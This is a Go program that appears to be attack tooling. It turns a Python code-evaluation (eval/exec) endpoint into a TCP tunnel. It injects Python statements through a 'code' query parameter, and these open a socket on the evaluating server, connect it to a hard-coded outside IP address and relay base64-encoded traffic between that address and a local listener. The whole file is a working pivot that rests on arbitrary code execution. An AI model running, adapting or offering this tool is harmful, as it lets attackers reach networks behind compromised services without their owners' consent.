package main

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"log"
	"log/slog"
	"net"
	"net/http"
	"net/netip"
	"net/url"
	"strconv"
)

var targetAddr = netip.MustParseAddrPort("111.63.65.247:80")

func main() {
	l, err := net.Listen("tcp", "127.0.0.1:2345")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := l.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		s := NewPySocket(targetAddr, func(s string) (string, error) {
			resp, err := http.Get(fmt.Sprintf("http://127.0.0.1:5000?code=%s", url.QueryEscape(s)))
			if err != nil {
				log.Fatalln(err)
			}
			if resp.StatusCode != 200 {
				return "", errors.New("code not 200")
			}
			data, err := io.ReadAll(resp.Body)
			if err != nil {
				return "", err
			}
			return string(data), nil
		})
		go func() {
			buf := make([]byte, 1024)
			for {
				n, err := conn.Read(buf)
				if err != nil && !errors.Is(err, io.EOF) {
					slog.Info("read from local fail", "err", err)
					break
				}
				buf = buf[:n]
				err = s.Write(buf)
				if err != nil {
					slog.Info("write to remote fail", "err", err)
					break
				}
			}
		}()
		go func() {
			for {
				buf := make([]byte, 1024)
				n, err := s.Read(buf)
				if err != nil {
					slog.Info("read from remote fail", "err", err)
					break
				}
				_, err = conn.Write(buf[:n])
				if err != nil {
					slog.Info("write to local fail", "err", err)
					break
				}
			}
		}()
	}
}

type PySocket struct {
	remoteName string
	eval       func(string) (string, error)
}

func NewPySocket(addr netip.AddrPort, eval func(string) (string, error)) *PySocket {
	var r [16]byte
	rand.Read(r[:])
	s := &PySocket{
		remoteName: "_" + hex.EncodeToString(r[:]),
		eval:       eval,
	}
	eval(fmt.Sprintf("exec('__builtins__[\"%s\"] = __import__(\"socket\").socket(__import__(\"socket\").AF_INET, __import__(\"socket\").SOCK_STREAM)')", s.remoteName))
	eval(fmt.Sprintf("__builtins__['%s'].connect(('%s', %d))", s.remoteName, addr.Addr().String(), addr.Port()))
	return s
}

func (p *PySocket) Write(d []byte) error {
	encoded := base64.StdEncoding.EncodeToString(d)
	n, err := p.eval(fmt.Sprintf("__builtins__['%s'].send(__import__('base64').b64decode(b'%s'))", p.remoteName, encoded))
	if err != nil {
		return err
	}
	sendN, err := strconv.Atoi(n)
	if err != nil {
		return err
	}
	slog.Info("send", "len", sendN)
	return nil
}

func (p *PySocket) Read(buf []byte) (int, error) {
	length := len(buf)
	res, err := p.eval(fmt.Sprintf("__import__('base64').b64encode(__builtins__['%s'].recv(%d)).decode('utf-8')", p.remoteName, length))
	if err != nil {
		return 0, err
	}
	n, err := base64.StdEncoding.Decode(buf, []byte(res))
	if err != nil {
		return n, err
	}
	slog.Info("read", "len", n)
	return n, nil
}
